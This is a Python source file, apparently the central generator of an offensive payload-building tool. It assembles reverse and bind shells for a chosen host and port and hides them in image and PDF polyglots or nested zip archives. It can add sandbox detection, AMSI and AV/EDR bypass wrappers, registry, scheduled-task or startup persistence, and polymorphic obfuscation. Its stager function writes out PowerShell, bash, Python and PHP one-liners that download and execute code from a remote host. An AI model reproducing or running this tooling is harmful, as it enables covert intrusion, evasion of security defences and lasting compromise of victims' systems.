from ..templates.manager import TemplateManager
from ..obfuscators.polymorphic import PolymorphicEngine
from .polyglot import PolyglotEngine
from ..bypasses.archives import ArchiveBypass
from ..bypasses.sandbox import SandboxDetector
from ..bypasses.persistence import PersistenceEngine
from ..bypasses.av_edr import AVEDRBypass
from .config import EXTENSION_ALIASES

class Generator:
    def __init__(self):
        self.template_manager = TemplateManager()
        self.polymorphic_engine = PolymorphicEngine()
        self.polyglot_engine = PolyglotEngine()
        self.archive_bypass = ArchiveBypass()
        self.sandbox_detector = SandboxDetector()
        self.persistence_engine = PersistenceEngine()
        self.av_bypass = AVEDRBypass()

    def resolve_extension(self, extension):
        """Resolve extension aliases (e.g., ps1 -> powershell)"""
        return EXTENSION_ALIASES.get(extension, extension)

    def generate(self, host, port, extension, output_file, obfuscate=False, bypass=None, 
                 shell_type="reverse", sandbox_evasion=False, persistence=None, 
                 av_evasion=None):
        """
        Main generation logic.
        
        Args:
            host: Target host/IP
            port: Target port
            extension: Payload type/extension
            output_file: Output file path
            obfuscate: Enable polymorphic obfuscation
            bypass: Bypass technique (zip_in_zip, etc.)
            shell_type: "reverse" or "bind"
            sandbox_evasion: Add VM/sandbox detection
            persistence: Persistence method (registry, task, startup)
            av_evasion: AV/EDR bypass level (amsi, full, max)
        """
        # Resolve aliases
        extension = self.resolve_extension(extension)
        
        # Map polyglot extensions to their payload types
        template_ext = extension
        
        if extension in ["png", "jpg"]:
            template_ext = "php"
        elif extension == "pdf":
            template_ext = "js"
            
        # Get base content
        if extension == "pdf":
            # PDF with embedded JavaScript
            js_payload = f"app.launchURL('http://{host}:{port}/run', true);"
            content = js_payload
        else:
            try:
                content = self.template_manager.render(template_ext, host, port, shell_type)
            except ValueError as e:
                # Try reverse if bind not available
                if shell_type == "bind":
                    try:
                        content = self.template_manager.render(template_ext, host, port, "reverse")
                    except ValueError:
                        raise e
                else:
                    raise

        # Add sandbox evasion if requested
        if sandbox_evasion:
            content = self._add_sandbox_evasion(content, template_ext)

        # Add AV/EDR evasion if requested
        if av_evasion:
            content = self._add_av_evasion(content, template_ext, av_evasion)

        # Add persistence if requested
        if persistence:
            content = self._add_persistence(content, template_ext, persistence, output_file)

        # Apply obfuscation
        if obfuscate:
            content = self.polymorphic_engine.obfuscate(content, template_ext)

        # Apply polyglot/format generation
        final_data = content.encode('utf-8') if isinstance(content, str) else content
        
        if extension == "pdf":
            final_data = self.polyglot_engine.generate_pdf(content).encode('utf-8')
        elif extension in ["png", "jpg"]:
            final_data = self.polyglot_engine.generate_png_polyglot(content)
            
        # Apply archive bypass
        if bypass == "zip_in_zip":
            final_data = self.archive_bypass.create_zip_in_zip("shell." + extension, final_data)
            if output_file:
                if not output_file.endswith(".zip"):
                    output_file += ".zip"
            else:
                output_file = "shell.zip"

        # Write output or return content
        if output_file:
            mode = 'wb' if isinstance(final_data, bytes) else 'w'
            with open(output_file, mode) as f:
                if isinstance(final_data, bytes):
                    f.write(final_data)
                else:
                    f.write(final_data)
            return output_file
        else:
            try:
                return final_data.decode('utf-8') if isinstance(final_data, bytes) else final_data
            except:
                return final_data

    def _add_sandbox_evasion(self, content, extension):
        """Add sandbox/VM detection to payload"""
        if extension in ["powershell", "ps1", "amsi"]:
            checks = self.sandbox_detector.get_powershell_checks()
            return checks + "\n" + content
        elif extension == "python":
            checks = self.sandbox_detector.get_python_checks()
            return checks + "\n" + content
        elif extension == "bash":
            checks = self.sandbox_detector.get_bash_checks()
            return checks + "\n" + content
        return content

    def _add_av_evasion(self, content, extension, level):
        """Add AV/EDR bypass techniques to payload"""
        if extension in ["powershell", "ps1", "amsi", "sct", "xsl", "msbuild", "installutil"]:
            return self.av_bypass.wrap_powershell_bypass(content, level)
        elif extension in ["cs", "csharp"]:
            return self.av_bypass._wrap_csharp_evasion(content)
        elif extension in ["vbs", "vbscript"]:
            return self.av_bypass._wrap_vbs_evasion(content)
        elif extension == "hta":
            return self.av_bypass._wrap_hta_evasion(content)
        elif extension in ["python", "py"]:
            return self.av_bypass._wrap_python_evasion(content)
        elif extension in ["bash", "sh"]:
            return self.av_bypass._wrap_bash_evasion(content)
        return content

    def _add_persistence(self, content, extension, method, output_file):
        """Add persistence mechanism to payload"""
        if extension not in ["powershell", "ps1", "amsi", "bat"]:
            return content
            
        payload_path = output_file if output_file else "C:\\Windows\\Temp\\update.ps1"
        
        if method == "registry":
            persist = self.persistence_engine.generate_registry_persistence(payload_path)
        elif method == "task":
            persist = self.persistence_engine.generate_scheduled_task(payload_path)
        elif method == "startup":
            persist = self.persistence_engine.generate_startup_lnk(payload_path)
        else:
            return content
            
        return content + "\n\n" + persist

    def generate_stager(self, host, port, extension):
        """Generate a simple stager that downloads and executes the main payload"""
        extension = self.resolve_extension(extension)
        
        stagers = {
            "powershell": f"IEX(New-Object Net.WebClient).DownloadString('http://{host}:{port}/run.ps1')",
            "bash": f"curl -s http://{host}:{port}/run.sh | bash",
            "python": f"import urllib.request; exec(urllib.request.urlopen('http://{host}:{port}/run.py').read())",
            "php": f"<?php eval(file_get_contents('http://{host}:{port}/run.php')); ?>",
        }
        
        return stagers.get(extension, stagers.get("bash"))
